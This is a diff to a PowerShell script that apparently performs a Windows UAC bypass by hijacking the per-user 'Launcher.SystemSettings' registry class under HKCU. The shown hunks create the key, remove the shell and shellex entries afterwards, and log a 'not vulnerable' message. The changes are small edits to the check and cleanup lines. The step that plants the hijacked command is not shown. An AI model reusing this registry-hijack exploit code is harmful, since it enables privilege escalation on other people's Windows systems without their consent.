@@ -51,8 +51,8 @@ If(-not($param1) -or $param1 -eq $null){
    $Command = "$param1"
 }
 
-$CheckVuln = Test-Path -Path "HKCU:\Software\Classes\" -EA SilentlyContinue
-If($CheckVuln){
+$CheckVuln = Test-Path -Path "HKCU:\Software\Classes" -EA SilentlyContinue
+If($CheckVuln -eq $True){
 
    ### Add Entrys to Regedit {powershell}
    New-Item "HKCU:\Software\Classes\Launcher.SystemSettings" -Force|Out-Null;Start-Sleep -Seconds 1
@@ -79,10 +79,11 @@ If($CheckVuln){
    ### Revert Regedit to 'DEFAULT' settings after all testings done ..
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shell" -Recurse -Force;Start-Sleep -Seconds 1
    Remove-Item "HKCU:\Software\Classes\Launcher.SystemSettings\shellex" -Recurse -Force;Start-Sleep -Seconds 1
-   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force;Start-Sleep -Seconds 2
+   Set-ItemProperty -Path "HKCU:\Software\Classes\Launcher.SystemSettings" -Name "(default)" -Value '' -Force
+   Start-Sleep -Seconds 2
 
 }else{
-   echo "   [ERROR]  System Doesn't Seems Vulnerable, Aborting .." > $env:TMP\fail.log
+   echo "   ERROR    System Doesn't Seems Vulnerable, Aborting." > $env:TMP\fail.log
 }
 
 
